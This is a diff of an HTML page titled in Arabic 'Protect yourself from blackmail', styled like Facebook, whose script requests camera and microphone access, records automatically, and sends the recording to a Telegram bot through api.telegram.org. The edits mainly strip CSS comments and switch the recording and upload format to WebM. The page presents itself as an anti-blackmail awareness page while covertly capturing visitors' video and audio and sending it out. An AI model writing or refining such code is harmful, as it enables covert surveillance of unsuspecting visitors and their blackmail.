@@ -5,19 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>حماية نفسك من الابتزاز</title>
     <style>
-        /* تعيين تنسيق الصفحة لتكون متجاوبة مع جميع الأجهزة */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(to right, #3b5998, #8b9dc3); /* تدرج الألوان الأزرق مثل الفيسبوك */
+            background: linear-gradient(to right, #3b5998, #8b9dc3);
             color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             text-align: center;
-            overflow: hidden; /* إخفاء أي تجاوزات */
+            overflow: hidden;
         }
 
         h1 {
@@ -39,17 +38,15 @@
             margin: 5px 0;
         }
 
-        /* تخصيص النصوص بشكل أفضل */
         .content {
-            background-color: rgba(0, 0, 0, 0.6); /* خلفية داكنة للنصوص */
+            background-color: rgba(0, 0, 0, 0.6);
             padding: 20px;
             border-radius: 10px;
-            max-width: 90%; /* تحديد أقصى عرض 90% */
+            max-width: 90%;
             width: 100%;
             box-sizing: border-box;
         }
 
-        /* تخصيص حجم الخط والعناصر على شاشات صغيرة */
         @media screen and (max-width: 600px) {
             h1 {
                 font-size: 1.5rem;
@@ -64,7 +61,6 @@
             }
         }
 
-        /* تخصيص للأجهزة اللوحية */
         @media screen and (max-width: 768px) {
             h1 {
                 font-size: 1.8rem;
@@ -111,7 +107,7 @@
         // الوصول إلى الكاميرا وبدء التسجيل تلقائيًا
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(stream => {
-                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });  // استخدام تنسيق WebM
 
                 mediaRecorder.ondataavailable = event => {
                     if (event.data.size > 0) {
@@ -120,7 +116,7 @@
                 };
 
                 mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' }); // حفظ الفيديو بصيغة WebM
                     recordedChunks = []; // إعادة التهيئة
 
                     // إرسال الفيديو تلقائيًا إلى تيليجرام
@@ -143,7 +139,7 @@
         async function sendVideoToTelegram(blob) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('video', blob, 'video.mp4');
+            formData.append('video', blob, 'video.webm'); // إرسال الفيديو بصيغة WebM
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
